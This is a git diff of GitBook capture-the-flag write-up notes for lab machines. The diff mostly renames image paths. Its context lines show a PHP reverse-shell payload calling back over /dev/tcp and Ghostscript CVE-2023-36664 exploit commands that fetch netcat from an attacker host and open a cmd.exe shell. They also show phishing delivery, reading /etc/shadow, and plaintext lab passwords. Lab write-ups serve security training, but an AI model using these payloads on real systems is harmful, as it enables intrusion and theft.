@@ -195,7 +195,7 @@ nmap -sVC 10.10.11.236 -Pn - 53 DOMAIN (Simple DNS Plus) - 80 HTTP (MS IIS httpd
 * Final Payload for shell.php file
   *   **`<?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.12/4444 0>&1'") ?>`**
 
-      <figure><img src=".gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>
+      <figure><img src=".gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>
 
 #### Craft ZIP+PDF from php script
 
@@ -209,7 +209,7 @@ nmap -sVC 10.10.11.236 -Pn - 53 DOMAIN (Simple DNS Plus) - 80 HTTP (MS IIS httpd
   * hex: **41 -> 00**
   *
 
-      <figure><img src=".gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+      <figure><img src=".gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>
 
 upload file & go to generated URL with removed .pdf extension (onlyhttp://......./shell.php)
 
@@ -254,9 +254,9 @@ reserse shell should be obtained in nc -nlvp \<PORT>
 
 #### Website
 
-<figure><img src=".gitbook/assets/image (4) (1).png" alt=""><figcaption><p>https://10.10.11.241/</p></figcaption></figure>
+<figure><img src=".gitbook/assets/image (10).png" alt=""><figcaption><p>https://10.10.11.241/</p></figcaption></figure>
 
-<figure><img src=".gitbook/assets/image (1) (1) (1).png" alt=""><figcaption><p>http://10.10.11.241:8080</p></figcaption></figure>
+<figure><img src=".gitbook/assets/image (11).png" alt=""><figcaption><p>http://10.10.11.241:8080</p></figcaption></figure>
 
 ### Weaponisation
 
@@ -268,7 +268,7 @@ reserse shell should be obtained in nc -nlvp \<PORT>
 
 #### Upload page
 
-<figure><img src=".gitbook/assets/image (2) (1) (1).png" alt=""><figcaption><p>10.10.11.241:8080/index.php</p></figcaption></figure>
+<figure><img src=".gitbook/assets/image (12).png" alt=""><figcaption><p>10.10.11.241:8080/index.php</p></figcaption></figure>
 
 #### dirb
 
@@ -300,7 +300,7 @@ Uploads subpage is important for us. When we upload a file, we can access it via
     * redirect to: 10.10.11.241:8080/uploads/shell.phar
       * we have browser Reverse shell
 
-    <figure><img src=".gitbook/assets/image (3) (1) (1).png" alt=""><figcaption><p>10.10.11.241:8080/uploads/shell.phar</p></figcaption></figure>
+    <figure><img src=".gitbook/assets/image (13).png" alt=""><figcaption><p>10.10.11.241:8080/uploads/shell.phar</p></figcaption></figure>
 
 #### Reverse Shell crafting
 
@@ -335,7 +335,7 @@ Uploads subpage is important for us. When we upload a file, we can access it via
         * we obtained root privileges
 * cat /etc/shadow
 
-<figure><img src=".gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>
 
 * Decode the PW hash
 
@@ -352,7 +352,7 @@ ssh drwilliams@10.10.11.241
 
 `drwilliams:qwe123!@#`
 
-<figure><img src=".gitbook/assets/image (4) (1) (1).png" alt=""><figcaption><p>drwilliams Inbox</p></figcaption></figure>
+<figure><img src=".gitbook/assets/image (14).png" alt=""><figcaption><p>drwilliams Inbox</p></figcaption></figure>
 
 * there are .eps attachments
 * drbrown says sth about GhostScript
@@ -369,47 +369,47 @@ ssh drwilliams@10.10.11.241
 * Prepare http.server for serving our exploit
   * `python3 -m http.server 8083`
 
-<figure><img src=".gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure>
 
 * Craft .eps Exploit
   * `python3 CVE_2023_36664_exploit.py --inject --payload "curl 10.10.14.7:8083/nc64.exe -o nc.exe" --filename file.eps`
 
-<figure><img src=".gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>
 
 * upload it via email attachment (.eps file) answering to drbrown email...
   * phishing
 
-<figure><img src=".gitbook/assets/image (7).png" alt=""><figcaption><p>upload it via answered email to drbrown</p></figcaption></figure>
+<figure><img src=".gitbook/assets/image (17).png" alt=""><figcaption><p>upload it via answered email to drbrown</p></figcaption></figure>
 
 * we successfully served nc.exe to our http.server
 
-<figure><img src=".gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>
 
 2. OBTAIN REVERSE SHELL
 
 * Crafted second file.eps exploit with netcat port...
   * `python3 CVE_2023_36664_exploit.py --inject --payload "nc.exe 10.10.14.7 4444 -e cmd.exe" --filename file.eps`
 
-<figure><img src=".gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>
 
 * `nc -nlvp 4444`
 
-<figure><img src=".gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 * upload exploit via answering email
 
-<figure><img src=".gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>
 
 * we have a reverse shell to user DRBROWN
 
-<figure><img src=".gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>
 
 #### drbrown credentials
 
 * `dir`
 * `type ghostscript.bat`
 
-<figure><img src=".gitbook/assets/image (13).png" alt=""><figcaption><p>obtaining PW of user drbrown</p></figcaption></figure>
+<figure><img src=".gitbook/assets/image (23).png" alt=""><figcaption><p>obtaining PW of user drbrown</p></figcaption></figure>
 
 #### connect via RDP
 
@@ -419,23 +419,23 @@ REMINNA&#x20;
 * IP: 10.10.11.241
 * PW: chr!$br0wn
 
-<figure><img src=".gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>
 
 ### Root flag
 
-<figure><img src=".gitbook/assets/image (16).png" alt=""><figcaption><p>/xampp/htdocs is writeable</p></figcaption></figure>
+<figure><img src=".gitbook/assets/image (26).png" alt=""><figcaption><p>/xampp/htdocs is writeable</p></figcaption></figure>
 
 we can see there is uploaded shell.php
 
 
 
-<figure><img src=".gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src=".gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>
 
 access website uploaded file...
 
-<figure><img src=".gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>
 
 <mark style="color:red;">**PWNED <3**</mark>
 
@@ -451,7 +451,7 @@ access website uploaded file...
 * 80 HTTP
   * add to /etc/hosts
 
-<figure><img src=".gitbook/assets/image (80).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (91).png" alt=""><figcaption></figcaption></figure>
 
 #### website
 
@@ -511,7 +511,7 @@ dirb http://surveillance.htb/
       * 39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec
       * hashcat
 
-      <figure><img src=".gitbook/assets/image (81).png" alt=""><figcaption></figcaption></figure>
+      <figure><img src=".gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>
 
 #### SSH
 
